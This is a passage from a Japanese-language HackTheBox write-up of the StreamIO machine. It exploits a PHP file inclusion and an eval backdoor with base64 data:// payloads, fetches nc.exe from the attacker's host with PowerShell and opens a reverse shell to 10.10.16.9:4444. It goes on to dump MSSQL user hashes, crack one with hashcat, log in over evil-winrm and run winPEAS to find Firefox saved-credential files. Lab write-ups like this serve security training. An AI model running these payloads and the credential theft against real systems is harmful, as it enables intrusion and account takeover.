RlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==               </div>
        </center>
</body>
</html>
```
base64デコード  
先ほどのラッパーを使用すればどのファイルもdebugパラメータにインクルード処理されるっぽい  
ちなみにrfiは動作しなかった  
また怪しいsqlコードもあるね
```php
└─$ base64 -d base64_index.php 
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <title>Admin panel</title>
        <link rel = "icon" href="/images/icon.png" type = "image/x-icon">
        <!-- Basic -->
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <!-- Mobile Metas -->
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <!-- Site Metas -->
        <meta name="keywords" content="" />
        <meta name="description" content="" />
        <meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        <!-- Custom styles for this template -->
        <link href="/css/style.css" rel="stylesheet" />
        <!-- responsive style -->
        <link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
        <center class="container">
                <br>
                <h1>Admin panel</h1>
                <br><hr><br>
                <ul class="nav nav-pills nav-fill">
                        <li class="nav-item">
                                <a class="nav-link" href="?user=">User management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?staff=">Staff management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?movie=">Movie management</a>
                        </li>
                        <li class="nav-item">
                                <a class="nav-link" href="?message=">Leave a message for admin</a>
                        </li>
                </ul>
                <br><hr><br>
                <div id="inc">
                        <?php
                                if(isset($_GET['debug']))
                                {
                                        echo 'this option is for developers only';
                                        if($_GET['debug'] === "index.php") {
                                                die(' ---- ERROR ----');
                                        } else {
                                                include $_GET['debug'];
                                        }
                                }
                                else if(isset($_GET['user']))
                                        require 'user_inc.php';
                                else if(isset($_GET['staff']))
                                        require 'staff_inc.php';
                                else if(isset($_GET['movie']))
                                        require 'movie_inc.php';
                                else 
                        ?>
                </div>
        </center>
</body>
</html>
```


## STEP 6
step2で確認できたadmin配下のindex.phpともう一つ、master.phpのソースを確認すると
```sh
└─$  curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=master.php'

~~~

                <div id="inc">
                        this option is for developers onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==          </div>
        </center>
</body>
</html>
```
```php
└─$ base64 -d base64_master.php     
<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
このphpはインクルード経由でないとアクセスできないっぽい  
このメッセージはstep5で確認できた通りのやつ
```php
if(!defined('included'))
        die("Only accessable through includes");
```
postメソッドのincludeパラメータの値を`file_get_contents`で読み取った後、`eval`で実行されていることを確認
```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
ということは、攻撃者のサーバ上にある悪性phpを読み取り・実行させることができそう  
phpは「ivan sincek」のやつそのままパクっていいが、今回はシンブルに
```php
system("コマンド");
```
のwebshellを使う  
ここでphp自体もラッパーを使用してhttpsリクエストに埋め込むことが可能らしい、[リンク](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-data)  
ためしにwhoamiを実行してみると成功
```sh
└─$ echo 'system("whoami");' | base64
c3lzdGVtKCJ3aG9hbWkiKTsK

└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -d 'include=data://text/plain;base64,c3lzdGVtKCJ3aG9hbWkiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php' 

~~~

</form>
streamio\yoshihide
                </div>
        </center>
</body>
</html>
```
nc.exeをkaliからダウンロード・実行させる
```sh
└─$ cp /usr/share/windows-resources/binaries/nc.exe .                        

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```sh
└─$ echo 'system("powershell -c Invoke-Webrequest http://10.10.16.9/nc.exe -outfile nc.exe");' | base64 -w 0
c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK

└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -d 'include=data://text/plain;base64,c3lzdGVtKCJwb3dlcnNoZWxsIC1jIEludm9rZS1XZWJyZXF1ZXN0IGh0dHA6Ly8xMC4xMC4xNi45L25jLmV4ZSAtb3V0ZmlsZSBuYy5leGUiKTsK' 'https://streamio.htb/admin/index.php?debug=master.php'

└─$ echo 'system("nc.exe -e cmd 10.10.16.9 4444");' | base64 -w 0 
c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=

└─$ curl -H 'Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip' -k -d 'include=data://text/plain;base64,c3lzdGVtKCJuYy5leGUgLWUgY21kIDEwLjEwLjE2LjkgNDQ0NCIpOwo=' 'https://streamio.htb/admin/index.php?debug=master.php'

```
リバースシェル取得
```powershell
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.9] from (UNKNOWN) [10.129.70.54] 52458

PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide
```
 

## STEP 7
各ユーザのフォルダにアクセスできず、ユーザフラグすら取れない状況
```powershell
C:\inetpub\streamio.htb\admin>dir c:\users
dir c:\users
 Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of c:\users

02/22/2022  02:48 AM    <DIR>          .
02/22/2022  02:48 AM    <DIR>          ..
02/22/2022  02:48 AM    <DIR>          .NET v4.5
02/22/2022  02:48 AM    <DIR>          .NET v4.5 Classic
02/26/2022  10:20 AM    <DIR>          Administrator
05/09/2022  04:38 PM    <DIR>          Martin
02/26/2022  09:48 AM    <DIR>          nikk37
02/22/2022  01:33 AM    <DIR>          Public
               0 File(s)              0 bytes
               8 Dir(s)   7,227,252,736 bytes free

C:\inetpub\streamio.htb\admin>dir c:\users\martin
dir c:\users\martin
 Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of c:\users\martin

File Not Found

C:\inetpub\streamio.htb\admin>dir c:\users\nikk37
dir c:\users\nikk37
 Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of c:\users\nikk37

File Not Found
```
ここで、step5でindex.phpのコードをlfiで確認できたが`、sqlのクレデンシャルのようなものを発見した  
```php
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
```
sqlcmdがインストールされていたので、それを使ってmssqlにアクセス  
sqlcmdの使い方は[公式サイト](https://learn.microsoft.com/ja-jp/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver17&tabs=odbc%2Cwindows-support&pivots=cs1-bash#syntax)で確認  
mssqlの構文はsqlインジェクションでちょっと慣れていますね  
データベースを６つ確認、STEAMIOというデータベースがstep3,4でsqlインジェクション先であったことを確認
```powershell
C:\inetpub\streamio.htb\admin>sqlcmd -d streamio -P B1@hx31234567890 -U db_admin -Q "SELECT name FROM master.sys.databases"
sqlcmd -d streamio -P B1@hx31234567890 -U db_admin -Q "SELECT name FROM master.sys.databases"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup                                                                                                                 

(6 rows affected)
```
streamiob_backupのusersテーブルを確認すると、クレデンシャルのようなものを確認  
step3、4でみたものと似ているね、パスワードはmd5ハッシュ値？
```powershell
C:\inetpub\streamio.htb\admin>sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT table_name FROM information_schema.columns"
sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT table_name FROM information_schema.columns"
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
movies                                                                                                                          
movies                                                                                                                          
movies                                                                                                                          
movies                                                                                                                          
movies                                                                                                                          
users                                                                                                                           
users                                                                                                                           
users

C:\inetpub\streamio.htb\admin>sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT * FROM users"
sqlcmd -d streamio_backup -P B1@hx31234567890 -U db_admin -Q "SELECT * FROM users"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```
確認できた８つのクレデンシャルのうち、ユーザ名nikk37のmd5値がクラックできた
```sh
└─$ hashcat -a 0 -m 0 backup_pass /usr/share/wordlists/rockyou.txt --quiet    
389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
```
step1で5985番オープンを確認したが、nikk37はwinrmログイン可能であることを確認
```powershell
C:\inetpub\streamio.htb\admin>net localgroup "Remote Management Users"
net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
Martin
nikk37
The command completed successfully.
```
ということでwinrmでログイン成功  
ようやくユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.70.54 -u nikk37 -p get_dem_girls2@yahoo.com       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> cat ../desktop/user.txt
af990b51d8f6b1007dc48f06192c904e
```


## STEP 8
winpeasを配送
```sh
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .

└─$ python3.13 -m http.server 80                                                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
ブラウザ情報を確認すると、firefoxのdbファイルを発見  
key4.dbには、firefoxに保存されたクレデンシャルがあるらしい
```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> powershell /c "invoke-webrequest http://10.10.16.9/winPEASx64.exe -outfile winPEASx64.exe"

*Evil-WinRM* PS C:\Users\nikk37\Documents> .\winPEASx64.exe browserinfo quiet
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help                                                                                                       
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\                                                                             
       |                             Do you like PEASS?                                  |                                                                             
       |---------------------------------------------------------------------------------|                                                                             
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                             
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                             
       |         Respect on HTB            :     SirBroccoli                             |                                                                             
       |---------------------------------------------------------------------------------|                                                                             
       |                                 Thank you!                                      |                                                                             
       \---------------------------------------------------------------------------------/                                                                             
                                                                                                                                                                       
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...                                                                                                     
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                                         
   at System.Management.ManagementScope.Initialize()                                                                                                                   
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                          
   at System.Management.ManagementObjectSearcher.Get()                                                                                                                 
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                            
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
        [skipped, file search is disabled]


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history

    [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).


ÉÍÍÍÍÍÍÍÍÍÍ¹ Firefox history -- limit 50
                                                                                                                                                                       
    https://support.mozilla.org
    https://www.mozilla.org
    https://www.mozilla.org/privacy/firefox/gro.allizom.www

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)         
   --- End of inner exception stack trace ---                                                                                                                          
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                                                                                              
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                                                                  
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                                                              
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history


ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50
                                                                                                                                                                       
